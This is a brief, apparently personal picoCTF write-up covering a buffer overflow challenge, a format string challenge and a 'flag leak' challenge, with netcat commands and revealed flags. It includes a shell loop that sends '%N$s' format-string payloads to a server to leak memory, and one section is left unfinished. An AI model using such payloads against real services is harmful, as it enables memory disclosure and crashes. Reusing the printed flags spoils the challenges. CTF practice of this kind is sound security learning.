## Buffer overflow 0

This was a really simple challenge which only required me to find a way to smash the stack, ergo, buffer overflow. The program given in the challenge would basically print out the flag if there was a segmentation fault which would happen if we spammed the input with any character

<br/>
Used the server connection : nc saturn.picoctf.net 57100
```
srinidhia@srinidhis-mbp ~ % nc saturn.picoctf.net 57100
Input: OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO
OOOOOOOOOOOOOOOOOOOOOOOOOOO
picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}
```
The flag : picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}

****

## Format String 0

I used the same principle as before
```
srinidhia@srinidhis-mbp ~ % nc mimas.picoctf.net 51547

## Flag leak

```
srinidhia@srinidhis-mbp ~ % for i in {0..999}; do echo "%$i\$s" | nc saturn.picoctf.net 49843; done
```
The above line written basically is to print the string value(%s) from the address which we get from the index(i.e;i). We're then piping the server connection.

Output :

Amidst this, I got a significant part of the flag and after a while I just exited the long loop.
